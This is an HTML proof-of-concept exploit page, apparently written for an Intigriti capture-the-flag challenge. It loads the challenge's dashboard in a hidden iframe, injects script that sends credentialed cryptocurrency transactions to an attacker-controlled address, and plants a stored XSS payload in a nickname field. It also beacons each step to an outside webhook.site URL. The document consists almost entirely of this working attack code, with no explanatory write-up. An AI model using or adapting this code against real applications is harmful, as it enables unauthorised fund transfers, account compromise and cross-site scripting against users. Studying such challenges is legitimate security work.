<html>
<head><title>PoC</title></head>
<body>
<iframe id="f" style="display:none"></iframe>
<script>
const BASE = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/bcf23067-6898-4c8d-9741-26589bcc4876';
const YOUR_ADDRESS = '1cc4a7735c998cb4b4e390e97c349281d2';
const XSS_PAYLOAD = `<img src=x onerror="alert('gigawatz')">`;

// Inject exploit code that runs in same-origin context
const exploitCode = `
  async function pwn() {
    // Tx1: Send 2 1337COIN to your address
    await fetch('/api/transaction', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      credentials: 'include',
      body: JSON.stringify({
        toAddress: '${YOUR_ADDRESS}',
        currency: '1337COIN',
        amount: 0.5
      })
    });

    // Tx2: Send 2 1337COIN with XSS in nickname
    await fetch('/api/transaction', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      credentials: 'include',
      body: JSON.stringify({
        toAddress: '${YOUR_ADDRESS}',
        currency: '1337COIN',
        amount: 0.5,
        nickname: '${XSS_PAYLOAD}'
      })
    });

    window.location = '/marketwatch.html';
  }
  pwn();
`;

const f = document.getElementById('f');

f.onload = () => {
  fetch(`${WEBHOOK}/?step=iframe_loaded`);
  setTimeout(() => {
    try {
      // Try to inject script into the iframe
      const doc = f.contentWindow.document;
      const script = doc.createElement('script');
      script.textContent = exploitCode;
      doc.body.appendChild(script);
      fetch(`${WEBHOOK}/?step=script_injected`);
    } catch (e) {
      fetch(`${WEBHOOK}/?step=inject_failed_${encodeURIComponent(e.message)}`);
    }
  }, 2000);
};

fetch(`${WEBHOOK}/?step=started`);
f.src = `${BASE}/dashboard.html`;
</script>
</body>
</html>
